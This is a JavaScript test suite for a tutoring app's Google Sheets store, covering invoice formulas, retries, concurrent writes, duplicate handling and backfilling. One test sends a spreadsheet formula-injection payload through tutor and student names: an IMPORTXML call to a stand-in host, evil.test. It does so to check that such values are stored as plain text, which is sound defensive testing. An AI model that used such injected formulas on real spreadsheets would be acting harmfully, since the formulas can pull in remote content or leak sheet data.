import test from 'node:test';
import assert from 'node:assert/strict';
import { TutorStore } from '../public/store.js';
import { FakeGoogle } from './fake-google.js';
const payload={name:'Priya',rate:20,startMonth:'2026-09',groups:[{id:'g0',label:'Saturday',year:'11+',start:'09:00',end:'10:30',students:['Sam','Samuel'],colour:'#c9e7ff'}]};
const log={date:'2026-09-19',slots:[{groupId:'g0',students:['Sam']}],adhoc:[{student:'Guest',year:'11+',start:'11:00',end:'12:30'}]};
async function setup(){const google=new FakeGoogle(),store=new TutorStore(google.request);await store.createTutorSheet(payload);return {google,store};}
test('onboard, recover on another device and keep the same owned sheet',async()=>{
 const {google,store}=await setup();const other=new TutorStore(google.request);const state=await other.getState('tutor@example.com');
 assert.equal(state.config.sheetId,store.sheetId);assert.equal(state.config.name,'Priya');assert.equal(state.onboarded,true);assert.equal(google.files.length,1);
 assert.deepEqual(state.months.map(m=>m.title),['Sep26']);   // month tabs (title+gid) for invoice-email deep links
 assert.equal(state.months[0].gid,google.books.get(store.sheetId).sheets.find(s=>s.properties.title==='Sep26').properties.sheetId);
 assert.deepEqual(google.books.get(store.sheetId).sheets.map(s=>s.properties.title),['Summary Statement','Sep26']);
 const sb=google.books.get(store.sheetId),ssid=sb.sheets.find(s=>s.properties.title==='Sep26').properties.sheetId;
 assert.equal(sb.cells[ssid][4][9].userEnteredValue.formulaValue,'=MAX(G5:G)');  // new sheet uses the drift-proof total
 await other.createTutorSheet(payload);assert.equal(google.files.length,1);
});
test('partial group and one-off write exact cumulative formulae atomically',async()=>{
 const {google,store}=await setup();const result=await store.saveLog(log,'request-1');assert.equal(result.written,2);
 const b=google.books.get(store.sheetId),sid=b.sheets.find(s=>s.properties.title==='Sep26').properties.sheetId;
 assert.equal(b.cells[sid][5][2].userEnteredValue.stringValue,'Sam');
 assert.equal(b.cells[sid][4][9].userEnteredValue.formulaValue,'=MAX(G5:G)');  // J5 total: starts at header row, drift-proof, excludes the G3 month date
 assert.equal(b.cells[sid][5][8].userEnteredValue.stringValue,'Total payment');  // label rebuilt beside its value
 assert.equal(b.cells[sid][5][9].userEnteredValue.formulaValue,'=20*J5');
 assert.equal(b.cells[sid][5][6].userEnteredValue.formulaValue,'=ROUND((TIMEVALUE(F6)-TIMEVALUE(E6))*24,2)');
 assert.equal(b.cells[sid][6][6].userEnteredValue.formulaValue,'=ROUND(G6+(TIMEVALUE(F7)-TIMEVALUE(E7))*24,2)');
 assert.equal(b.cells[sid][6][3].userEnteredValue.stringValue,'11+');
 assert.equal(google.writes.length,2);
});
test('new year and multiple months added in one batch; summary covers each year',async()=>{
 const {google,store}=await setup();await store.saveLog({...log,slots:[{groupId:'g0',students:['Sam'],date:'2026-12-31'}],adhoc:[{...log.adhoc[0],date:'2027-01-01'}]},'year');
 const b=google.books.get(store.sheetId),sid=b.sheets[0].properties.sheetId;
 assert.equal(b.cells[sid][6][2].userEnteredValue.formulaValue,"='Sep26'!J6+'Dec26'!J6");
 assert.equal(b.cells[sid][7][2].userEnteredValue.formulaValue,"='Jan27'!J6");
 assert.equal(b.cells[sid][7][3].userEnteredValue.formulaValue,'=D7+C8');
});
test('connection lost after commit: retry returns receipt without duplicate rows',async()=>{
 const {google,store}=await setup();google.failAfterCommit=true;await assert.rejects(store.saveLog(log,'same-request'),/Connection lost/);
 const retry=new TutorStore(google.request);const result=await retry.saveLog(log,'same-request');assert.equal(result.written,2);assert.equal(google.writes.length,2);
});
test('simultaneous device writes cannot overwrite rows',async()=>{
 const {google,store}=await setup();const other=new TutorStore(google.request);other.sheetId=store.sheetId;
 const results=await Promise.allSettled([store.saveLog(log,'device1'),other.saveLog(log,'device2')]);
 assert.equal(results.filter(r=>r.status==='fulfilled').length,1);assert.equal(results.filter(r=>r.status==='rejected').length,1);assert.equal(google.writes.length,2);
});
test('settings conflict is visible; rate changes update every monthly tab',async()=>{
 const {google,store}=await setup();const st=await store.getState('test');await store.updateConfig({...st.config,rate:25});
 await assert.rejects(store.updateConfig({...st.config,rate:30}),/another device/);
 const b=google.books.get(store.sheetId);for(const s of b.sheets.slice(1)){assert.equal(b.cells[s.properties.sheetId][5][9].userEnteredValue.formulaValue,'=25*J5');assert.equal(b.cells[s.properties.sheetId][4][9].userEnteredValue.formulaValue,'=MAX(G5:G)');assert.equal(b.cells[s.properties.sheetId][5][8].userEnteredValue.stringValue,'Total payment');}  // totals block (drift-proof J5 + Total-payment label) rebuilt on every settings save
});
test('a settings save clears drifted Total-payment ghosts pushed into the data (cols I:J below row 6)',async()=>{
 const {google,store}=await setup();
 const sid=google.books.get(store.sheetId).sheets.find(s=>s.properties.title==='Sep26').properties.sheetId;
 const cells=google.books.get(store.sheetId).cells[sid]||={};
 cells[33]={8:{userEnteredValue:{stringValue:'Total payment'}},9:{userEnteredValue:{formulaValue:'=20*J5'}}};  // a ghost at row 34
 const st=await store.getState('test');await store.updateConfig({...st.config});
 const nb=google.books.get(store.sheetId).cells[sid];
 assert.equal(nb[33]?.[8],undefined);assert.equal(nb[33]?.[9],undefined);          // ghost cleared
 assert.equal(nb[5][8].userEnteredValue.stringValue,'Total payment');               // real label restored at row 6
});
test('a settings save removes exact-duplicate rows and rebuilds the hours column',async()=>{
 const {google,store}=await setup();
 await store.saveLog(log,'a');
 await store.saveLog({...log,force:true},'b');                 // force a full duplicate set
 const sid=google.books.get(store.sheetId).sheets.find(s=>s.properties.title==='Sep26').properties.sheetId;
 const count=()=>Object.keys(google.books.get(store.sheetId).cells[sid]).filter(k=>Number(k)>=5&&google.books.get(store.sheetId).cells[sid][k]?.[2]?.userEnteredValue).length;
 assert.equal(count(),4);                                      // 2 sessions logged twice
 const st=await store.getState('test');
 await store.updateConfig({...st.config});
 assert.equal(count(),2);                                      // duplicates removed, uniques kept
 const c=google.books.get(store.sheetId).cells[sid];
 assert.equal(c[5][6].userEnteredValue.formulaValue,'=ROUND((TIMEVALUE(F6)-TIMEVALUE(E6))*24,2)');  // G rebuilt from row 6
});
test('spreadsheet formulas cannot be injected through tutor or student names',async()=>{
 const {google,store}=await setup();const st=await store.getState('test');await store.updateConfig({...st.config,name:'=IMPORTXML("https://evil.test", "//x")'});
 await store.saveLog({date:'2026-09-19',adhoc:[{student:'=IMPORTXML("https://evil.test", "//x")',year:'=1+1',start:'09:00',end:'10:00'}]},'injection');
 const b=google.books.get(store.sheetId),sid=b.sheets[1].properties.sheetId;
 assert.ok(b.cells[sid][1][6].userEnteredValue.stringValue.startsWith('='));assert.ok(b.cells[sid][5][2].userEnteredValue.stringValue.startsWith('='));assert.equal(b.cells[sid][5][3].userEnteredValue.stringValue,'=1+1');
});
test('invalid session dates fail before writes',async()=>{
 const {google,store}=await setup();await assert.rejects(store.saveLog({...log,date:'2026-02-30'},'invalid'),/valid session date/);assert.equal(google.writes.length,1);
});
test('logging the same students on the same day warns before writing again',async()=>{
 const {google,store}=await setup();await store.saveLog(log,'first');const before=google.writes.length;
 await assert.rejects(store.saveLog({...log},'second'),e=>e.duplicate===true);
 assert.equal(google.writes.length,before);
 const forced=await store.saveLog({...log,force:true},'third');
 assert.equal(forced.written,2);assert.equal(google.writes.length,before+1);
});
test('same student on a different day is not treated as a duplicate',async()=>{
 const {google,store}=await setup();await store.saveLog(log,'day1');const before=google.writes.length;
 const next=await store.saveLog({date:'2026-09-20',slots:[{groupId:'g0',students:['Sam']}],adhoc:[]},'day2');
 assert.equal(next.written,1);assert.equal(google.writes.length,before+1);
});
test('changing a group colour re-colours that group\'s past logged rows (one-offs untouched)',async()=>{
 const {google,store}=await setup();await store.saveLog(log,'r1');
 const st=await store.getState('test');
 await store.updateConfig({...st.config,groups:st.config.groups.map(g=>({...g,colour:'#ff0000'}))});
 const b=google.books.get(store.sheetId),sid=b.sheets.find(s=>s.properties.title==='Sep26').properties.sheetId;
 const samBg=b.cells[sid][5][2].userEnteredFormat.backgroundColor;                  // group row -> new colour
 assert.equal(Math.round(samBg.red*255),255);assert.equal(Math.round((samBg.green||0)*255),0);
 assert.equal(b.cells[sid][5][2].userEnteredValue.stringValue,'Sam');               // value preserved
 const guestBg=b.cells[sid][6][2].userEnteredFormat.backgroundColor;                // one-off row -> untouched grey
 assert.ok(Math.round(guestBg.red*255)>200&&Math.round((guestBg.green||0)*255)>200);
});
test('backfilling an earlier date inserts it chronologically and rebuilds cumulative hours',async()=>{
 const {google,store}=await setup();
 await store.saveLog({date:'2026-09-20',slots:[{groupId:'g0',students:['Sam']}],adhoc:[]},'d20');
 await store.saveLog({date:'2026-09-04',slots:[{groupId:'g0',students:['Samuel']}],adhoc:[]},'d04');
 const b=google.books.get(store.sheetId),sid=b.sheets.find(s=>s.properties.title==='Sep26').properties.sheetId;
 assert.equal(b.cells[sid][5][1].userEnteredValue.formulaValue,'=DATE(2026,9,4)');   // row 6 = earlier date
 assert.equal(b.cells[sid][6][1].userEnteredValue.formulaValue,'=DATE(2026,9,20)');  // row 7 = later date
 assert.equal(b.cells[sid][5][2].userEnteredValue.stringValue,'Samuel');
 assert.equal(b.cells[sid][6][2].userEnteredValue.stringValue,'Sam');
 assert.equal(b.cells[sid][5][6].userEnteredValue.formulaValue,'=ROUND((TIMEVALUE(F6)-TIMEVALUE(E6))*24,2)');
 assert.equal(b.cells[sid][6][6].userEnteredValue.formulaValue,'=ROUND(G6+(TIMEVALUE(F7)-TIMEVALUE(E7))*24,2)');
});
test('createTutorSheet returns month tabs so a freshly-onboarded session can deep-link the invoice email',async()=>{
 const google=new FakeGoogle(),store=new TutorStore(google.request);
 const r=await store.createTutorSheet(payload);
 assert.deepEqual(r.months.map(m=>m.title),['Sep26']);   // start month tab, no reload needed
 assert.equal(r.months[0].gid,google.books.get(store.sheetId).sheets.find(s=>s.properties.title==='Sep26').properties.sheetId);
});
test('saveLog returns month tabs including a newly created month for the invoice deep link',async()=>{
 const {store}=await setup();
 const r=await store.saveLog({...log,slots:[{groupId:'g0',students:['Sam'],date:'2026-12-01'}],adhoc:[]},'dec');
 assert.ok(r.months.some(m=>m.title==='Sep26')&&r.months.some(m=>m.title==='Dec26'));
});
test('interrupted initial formatting reuses empty file on retry',async()=>{
 const google=new FakeGoogle();let once=true;const store=new TutorStore(async(m,u,b)=>{if(m==='POST'&&u.includes(':batchUpdate')&&once){once=false;throw new Error('offline');}return google.request(m,u,b);});
 await assert.rejects(store.createTutorSheet(payload),/offline/);await store.createTutorSheet(payload);assert.equal(google.files.length,1);
});
